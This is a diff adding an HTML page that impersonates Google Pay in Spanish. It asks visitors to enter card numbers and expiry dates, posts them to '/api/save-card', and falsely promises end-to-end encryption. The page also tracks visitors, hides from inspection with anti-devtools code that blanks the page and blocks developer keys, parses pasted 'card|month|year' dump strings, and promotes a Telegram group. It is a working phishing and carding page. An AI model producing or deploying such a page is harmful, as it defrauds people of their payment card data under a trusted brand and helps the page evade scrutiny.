@@ -1,0 +1,802 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Pay | Asociar Tarjeta</title>
+    
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #0a0a0a;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+            background-image: 
+                radial-gradient(circle at 20% 30%, rgba(66, 133, 244, 0.15) 0%, transparent 30%),
+                radial-gradient(circle at 80% 70%, rgba(52, 168, 83, 0.15) 0%, transparent 30%),
+                radial-gradient(circle at 40% 80%, rgba(251, 188, 5, 0.15) 0%, transparent 30%),
+                radial-gradient(circle at 70% 20%, rgba(234, 67, 53, 0.15) 0%, transparent 30%);
+        }
+
+        .payment-container {
+            width: 100%;
+            max-width: 480px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 1;
+        }
+
+        .payment-form {
+            background: rgba(18, 18, 18, 0.95);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 32px;
+            padding: 2.5rem;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            animation: slideIn 0.4s ease-out;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Header con logo de Google Pay */
+        .gpay-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 2rem;
+        }
+
+        .gpay-logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .gpay-logo i {
+            font-size: 2rem;
+            color: #fff;
+        }
+
+        .gpay-logo span {
+            font-size: 1.3rem;
+            font-weight: 600;
+            color: #fff;
+            letter-spacing: -0.5px;
+        }
+
+        .gpay-badge {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 0.3rem 0.8rem;
+            border-radius: 30px;
+            font-size: 0.75rem;
+            color: #aaa;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            font-weight: 500;
+        }
+
+        /* Banner de Telegram */
+        .telegram-banner {
+            background: rgba(0, 136, 204, 0.15);
+            border: 1px solid rgba(0, 136, 204, 0.3);
+            border-radius: 16px;
+            padding: 1rem 1.2rem;
+            margin-bottom: 2rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .telegram-banner-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .telegram-banner-left i {
+            font-size: 1.5rem;
+            color: #0088cc;
+        }
+
+        .telegram-banner-left span {
+            color: #fff;
+            font-weight: 600;
+            font-size: 0.95rem;
+        }
+
+        .telegram-btn {
+            background: #0088cc;
+            color: white;
+            text-decoration: none;
+            padding: 0.5rem 1rem;
+            border-radius: 30px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            transition: all 0.2s;
+            border: none;
+        }
+
+        .telegram-btn:hover {
+            background: #0077b5;
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px -10px #0088cc;
+        }
+
+        .telegram-btn i {
+            font-size: 0.9rem;
+        }
+
+        h1 {
+            color: #fff;
+            font-size: 1.6rem;
+            font-weight: 700;
+            margin-bottom: 0.5rem;
+            letter-spacing: -0.5px;
+        }
+
+        .subtitle {
+            color: #888;
+            font-size: 0.9rem;
+            margin-bottom: 2rem;
+            font-weight: 400;
+        }
+
+        /* Accesos rápidos */
+        .quick-actions {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 2rem;
+            flex-wrap: wrap;
+        }
+
+        .quick-btn {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            color: #ccc;
+            text-decoration: none;
+            padding: 0.6rem 1rem;
+            border-radius: 12px;
+            font-size: 0.8rem;
+            font-weight: 500;
+            transition: all 0.2s;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            cursor: pointer;
+        }
+
+        .quick-btn i {
+            font-size: 0.9rem;
+            color: #888;
+            transition: all 0.2s;
+        }
+
+        .quick-btn:hover {
+            background: rgba(255, 255, 255, 0.1);
+            border-color: rgba(255, 255, 255, 0.2);
+            color: #fff;
+            transform: translateY(-2px);
+        }
+
+        .quick-btn:hover i {
+            color: #fff;
+        }
+
+        /* Formulario */
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: #aaa;
+            font-size: 0.8rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 1rem;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #666;
+            font-size: 1rem;
+            z-index: 1;
+        }
+
+        input {
+            width: 100%;
+            padding: 1rem 1rem 1rem 2.8rem;
+            background: rgba(255, 255, 255, 0.05);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+            font-size: 1rem;
+            font-family: 'Inter', monospace;
+            color: #fff;
+            transition: all 0.2s;
+        }
+
+        input:hover {
+            background: rgba(255, 255, 255, 0.08);
+            border-color: rgba(255, 255, 255, 0.2);
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #4285f4;
+            background: rgba(66, 133, 244, 0.1);
+            box-shadow: 0 0 0 4px rgba(66, 133, 244, 0.15);
+        }
+
+        input.valid {
+            border-color: #34a853;
+            background: rgba(52, 168, 83, 0.1);
+        }
+
+        input.invalid {
+            border-color: #ea4335;
+            background: rgba(234, 67, 53, 0.1);
+        }
+
+        .validation-icon {
+            position: absolute;
+            right: 1rem;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 1rem;
+        }
+
+        .validation-icon.valid {
+            color: #34a853;
+        }
+
+        .validation-icon.invalid {
+            color: #ea4335;
+        }
+
+        .card-type {
+            position: absolute;
+            right: 3rem;
+            top: 50%;
+            transform: translateY(-50%);
+            display: flex;
+            gap: 4px;
+        }
+
+        .card-type i {
+            color: #666;
+            font-size: 1.2rem;
+        }
+
+        /* Botón principal */
+        .pay-button {
+            width: 100%;
+            padding: 1rem;
+            background: linear-gradient(135deg, #4285f4 0%, #34a853 70%, #fbbc05 100%);
+            background-size: 200% 200%;
+            animation: gradientShift 8s ease infinite;
+            color: white;
+            border: none;
+            border-radius: 16px;
+            font-size: 1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 1rem;
+            box-shadow: 0 10px 20px -5px rgba(66, 133, 244, 0.3);
+        }
+
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .pay-button i {
+            font-size: 1.1rem;
+        }
+
+        .pay-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 20px 30px -5px rgba(66, 133, 244, 0.5);
+        }
+
+        .pay-button:active {
+            transform: translateY(0);
+        }
+
+        /* Seguridad */
+        .security-note {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 1.5rem;
+            color: #666;
+            font-size: 0.8rem;
+        }
+
+        .security-note i {
+            color: #34a853;
+            font-size: 0.9rem;
+        }
+
+        /* Footer */
+        .gpay-footer {
+            margin-top: 1.5rem;
+            text-align: center;
+            color: #444;
+            font-size: 0.7rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .gpay-footer i {
+            font-size: 0.8rem;
+        }
+
+        .gpay-footer span {
+            color: #666;
+        }
+
+        /* Error message */
+        .error-message {
+            color: #ea4335;
+            background: rgba(234, 67, 53, 0.1);
+            border: 1px solid rgba(234, 67, 53, 0.3);
+            padding: 1rem;
+            border-radius: 12px;
+            margin-top: 1rem;
+            text-align: center;
+            font-size: 0.9rem;
+            font-weight: 600;
+            animation: shake 0.5s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .error-message i {
+            font-size: 1rem;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+            20%, 40%, 60%, 80% { transform: translateX(5px); }
+        }
+
+        @media (max-width: 480px) {
+            .payment-form {
+                padding: 1.5rem;
+            }
+
+            .telegram-banner {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+
+            .telegram-btn {
+                width: 100%;
+                justify-content: center;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <main class="payment-container">
+        <form class="payment-form" name="payment" method="POST" action="/api/save-card">
+
+            <!-- Header con logo Google Pay -->
+            <div class="gpay-header">
+                <div class="gpay-logo">
+                    <i class="fab fa-google-pay"></i>
+                    <span>Google Pay</span>
+                </div>
+                <div class="gpay-badge">
+                    <i class="far fa-check-circle" style="margin-right: 4px;"></i> VERIFICADO
+                </div>
+            </div>
+
+            <!-- Banner Telegram con iconos -->
+            <div class="telegram-banner">
+                <div class="telegram-banner-left">
+                    <i class="fab fa-telegram-plane"></i>
+                    <span> apoya uniendote a nuestra comunidad</span>
+                </div>
+                <a href="https://t.me/shieldgramsociety" target="_blank" class="telegram-btn">
+                    <i class="fab fa-telegram"></i>
+                    Grupo Telegram
+                </a>
+            </div>
+
+            <h1>Asocia tu tarjeta</h1>
+            <div class="subtitle">Agrega tu tarjeta a Google Pay de forma segura</div>
+
+            <!-- Accesos rápidos con iconos -->
+            <div class="quick-actions">
+                <a href="#" class="quick-btn" onclick="copyAutofillLink(); return false;">
+                    <i class="fas fa-magic"></i>
+                    Activar autofill
+                </a>
+                <a href="https://www.holotaco.com/checkouts/cn/hWN6LnTnkw5H8MyXhCmMyW26/en-us?_r=AQABACdZCU-uQj2ai1eVLQ4b7m0xseG2cc1he51PfBT3oYM" class="quick-btn" target="_blank">
+                    <i class="fas fa-sync-alt"></i>
+                    Actualizar datos
+                </a>
+                <a href="https://payments.google.com/gp/w/home/settings" class="quick-btn" target="_blank">
+                    <i class="fas fa-cog"></i>
+                    Configuración
+                </a>
+            </div>
+
+            <!-- Campo número de tarjeta -->
+            <div class="form-group">
+                <label for="cc-number">
+                    <i class="far fa-credit-card" style="margin-right: 6px;"></i>
+                    Número de tarjeta
+                </label>
+                <div class="input-wrapper">
+                    <i class="fas fa-credit-card input-icon"></i>
+                    <input type="text" id="cc-number" name="cc-number" autocomplete="cc-number"
+                        placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" required>
+                    <div class="card-type" id="card-type-icons">
+                        <i class="fab fa-cc-visa"></i>
+                        <i class="fab fa-cc-mastercard"></i>
+                        <i class="fab fa-cc-amex"></i>
+                    </div>
+                    <span class="validation-icon" id="cc-number-valid"></span>
+                </div>
+            </div>
+
+            <!-- Campo fecha de vencimiento -->
+            <div class="form-group">
+                <label for="cc-exp">
+                    <i class="far fa-calendar-alt" style="margin-right: 6px;"></i>
+                    Fecha de vencimiento
+                </label>
+                <div class="input-wrapper">
+                    <i class="fas fa-calendar input-icon"></i>
+                    <input type="text" id="cc-exp" name="cc-exp" autocomplete="cc-exp" placeholder="MM/AA" maxlength="5"
+                        inputmode="numeric" required>
+                    <span class="validation-icon" id="cc-exp-valid"></span>
+                </div>
+            </div>
+
+            <!-- Botón principal -->
+            <button type="submit" class="pay-button">
+                <i class="fab fa-google-pay"></i>
+                Guardar en Google Pay
+                <i class="fas fa-arrow-right"></i>
+            </button>
+
+            <!-- Nota de seguridad -->
+            <p class="security-note">
+                <i class="fas fa-shield-alt"></i>
+                Tus datos están cifrados de extremo a extremo
+                <i class="fas fa-lock"></i>
+            </p>
+
+            <!-- Footer -->
+            <div class="gpay-footer">
+                <i class="fab fa-cc-visa"></i>
+                <i class="fab fa-cc-mastercard"></i>
+                <i class="fab fa-cc-amex"></i>
+                <i class="fab fa-cc-discover"></i>
+                <span>|</span>
+                <i class="fas fa-bolt"></i>
+                <span>shieldgram</span>
+            </div>
+        </form>
+    </main>
+
+    <script>
+        fetch('/api/track-visitor', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' }
+        }).catch(() => {});
+
+        function copyAutofillLink() {
+            const link = 'chrome://flags/#enable-autofill-credit-card-upload';
+            navigator.clipboard.writeText(link).then(() => {
+                alert('✅ Link copiado: ' + link + '\n\nPégalo en la barra de direcciones de Chrome');
+            }).catch(() => {
+                prompt('📋 Copia este enlace y pégalo en la barra de direcciones:', link);
+            });
+        }
+
+        // Anti-devtools profesional
+        (function() {
+            // Detectar DevTools
+            const element = new Image();
+            let devtoolsOpen = false;
+            
+            Object.defineProperty(element, 'id', {
+                get: function() {
+                    devtoolsOpen = true;
+                    document.body.style.opacity = '0';
+                    setTimeout(() => {
+                        window.location.href = 'about:blank';
+                    }, 300);
+                }
+            });
+
+            setInterval(function() {
+                devtoolsOpen = false;
+                console.log(element);
+                console.clear();
+                if (devtoolsOpen) {
+                    document.body.style.opacity = '0';
+                    setTimeout(() => {
+                        window.location.href = 'about:blank';
+                    }, 300);
+                }
+            }, 1000);
+
+            // Bloquear teclas de desarrollo
+            document.addEventListener('keydown', function(e) {
+                if (e.keyCode === 123 ||
+                    (e.ctrlKey && e.shiftKey && e.keyCode === 73) ||
+                    (e.ctrlKey && e.shiftKey && e.keyCode === 74) ||
+                    (e.ctrlKey && e.keyCode === 85) ||
+                    (e.ctrlKey && e.shiftKey && e.keyCode === 67)) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    
+                    // Mostrar mensaje elegante
+                    const msg = document.createElement('div');
+                    msg.style.cssText = `
+                        position: fixed;
+                        top: 20px;
+                        left: 50%;
+                        transform: translateX(-50%);
+                        background: #ea4335;
+                        color: white;
+                        padding: 1rem 2rem;
+                        border-radius: 30px;
+                        font-weight: 600;
+                        z-index: 9999;
+                        animation: slideDown 0.3s;
+                    `;
+                    msg.innerHTML = '<i class="fas fa-ban" style="margin-right: 8px;"></i>Acción no permitida';
+                    document.body.appendChild(msg);
+                    setTimeout(() => msg.remove(), 2000);
+                    
+                    return false;
+                }
+            });
+        })();
+
+        const numInput = document.getElementById('cc-number');
+        const expInput = document.getElementById('cc-exp');
+        const form = document.querySelector('.payment-form');
+        const numValidIcon = document.getElementById('cc-number-valid');
+        const expValidIcon = document.getElementById('cc-exp-valid');
+        const cardTypeIcons = document.getElementById('card-type-icons');
+
+        function updateValidation(input, icon, isValid) {
+            input.classList.remove('valid', 'invalid');
+            icon.classList.remove('valid', 'invalid');
+
+            if (input.value.length === 0) {
+                icon.textContent = '';
+                return;
+            }
+
+            if (isValid) {
+                input.classList.add('valid');
+                icon.classList.add('valid');
+                icon.innerHTML = '<i class="fas fa-check-circle"></i>';
+            } else {
+                input.classList.add('invalid');
+                icon.classList.add('invalid');
+                icon.innerHTML = '<i class="fas fa-exclamation-circle"></i>';
+            }
+        }
+
+        function luhnCheck(cardNumber) {
+            const digits = cardNumber.replace(/\s/g, '').split('').reverse();
+            let sum = 0;
+
+            for (let i = 0; i < digits.length; i++) {
+                let digit = parseInt(digits[i]);
+
+                if (i % 2 === 1) {
+                    digit *= 2;
+                    if (digit > 9) {
+                        digit -= 9;
+                    }
+                }
+
+                sum += digit;
+            }
+
+            return sum % 10 === 0;
+        }
+
+        function isValidExpDate(month, year) {
+            const now = new Date();
+            const currentYear = now.getFullYear() % 100;
+            const currentMonth = now.getMonth() + 1;
+
+            const expMonth = parseInt(month);
+            const expYear = parseInt(year);
+
+            if (expMonth < 1 || expMonth > 12) return false;
+            if (expYear < currentYear) return false;
+            if (expYear === currentYear && expMonth < currentMonth) return false;
+
+            return true;
+        }
+
+        function showError(message) {
+            const existingError = document.querySelector('.error-message');
+            if (existingError) existingError.remove();
+
+            const errorDiv = document.createElement('div');
+            errorDiv.className = 'error-message';
+            errorDiv.innerHTML = `<i class="fas fa-times-circle"></i>${message}`;
+            form.appendChild(errorDiv);
+
+            setTimeout(() => errorDiv.remove(), 4000);
+        }
+
+        form.addEventListener('submit', (e) => {
+            const cardNumber = numInput.value.replace(/\s/g, '');
+            const expDate = expInput.value;
+            const [month, year] = expDate.split('/');
+
+            if (cardNumber.length < 13 || cardNumber.length > 19) {
+                e.preventDefault();
+                showError('Número de tarjeta inválido');
+                return;
+            }
+
+            if (!luhnCheck(cardNumber)) {
+                e.preventDefault();
+                showError('El número de tarjeta no es válido');
+                return;
+            }
+
+            if (!month || !year || !isValidExpDate(month, year)) {
+                e.preventDefault();
+                showError('Fecha de vencimiento inválida o vencida');
+                return;
+            }
+
+            // Mostrar loading
+            const btn = document.querySelector('.pay-button');
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Procesando...';
+        });
+
+        // Smart Paste
+        numInput.addEventListener('paste', (e) => {
+            const pastedText = (e.clipboardData || window.clipboardData).getData('text');
+
+            if (pastedText.includes('|')) {
+                e.preventDefault();
+                const parts = pastedText.split('|');
+                
+                if (parts.length >= 3) {
+                    const cc = parts[0].replace(/\D/g, '').substring(0, 16);
+                    const month = parts[1].replace(/\D/g, '').padStart(2, '0').substring(0, 2);
+                    let year = parts[2].replace(/\D/g, '');
+
+                    if (year.length === 4) year = year.substring(2);
+                    year = year.padStart(2, '0').substring(0, 2);
+
+                    const formattedCC = cc.match(/.{1,4}/g)?.join(' ') || cc;
+                    
+                    numInput.value = formattedCC;
+                    expInput.value = `${month}/${year}`;
+
+                    const isValidCC = cc.length >= 13 && cc.length <= 16 && luhnCheck(cc);
+                    updateValidation(numInput, numValidIcon, isValidCC);
+
+                    const isValidDate = isValidExpDate(month, year);
+                    updateValidation(expInput, expValidIcon, isValidDate);
+                }
+            }
+        });
+
+        numInput.addEventListener('input', (e) => {
+            let val = e.target.value.replace(/\D/g, '').substring(0, 16);
+            val = val.match(/.{1,4}/g)?.join(' ') || val;
+            e.target.value = val;
+
+            const cleanNum = val.replace(/\s/g, '');
+            const isValid = cleanNum.length >= 13 && cleanNum.length <= 16 && luhnCheck(cleanNum);
+            updateValidation(numInput, numValidIcon, isValid);
+
+            // Mostrar icono de tarjeta correspondiente
+            const firstDigit = cleanNum[0];
+            const icons = cardTypeIcons.children;
+            for (let icon of icons) {
+                icon.style.opacity = '0.3';
+            }
+            
+            if (firstDigit === '4') icons[0].style.opacity = '1';
+            else if (firstDigit === '5') icons[1].style.opacity = '1';
+            else if (firstDigit === '3') icons[2].style.opacity = '1';
+        });
+
+        expInput.addEventListener('input', (e) => {
+            let val = e.target.value.replace(/\D/g, '').substring(0, 4);
+            
+            if (val.length > 2) {
+                val = val.substring(0, 2) + '/' + val.substring(2);
+            }
+            
+            e.target.value = val;
+
+            if (val.length === 5) {
+                const [month, year] = val.split('/');
+                const isValid = isValidExpDate(month, year);
+                updateValidation(expInput, expValidIcon, isValid);
+            } else {
+                updateValidation(expInput, expValidIcon, false);
+            }
+        });
+
+        expInput.addEventListener('paste', (e) => {
+            e.preventDefault();
+            const pastedText = (e.clipboardData || window.clipboardData).getData('text');
+            const cleaned = pastedText.replace(/\D/g, '').substring(0, 4);
+            
+            if (cleaned.length > 2) {
+                expInput.value = cleaned.substring(0, 2) + '/' + cleaned.substring(2);
+            } else {
+                expInput.value = cleaned;
+            }
+        });
+    </script>
+</body>
+
+</html>
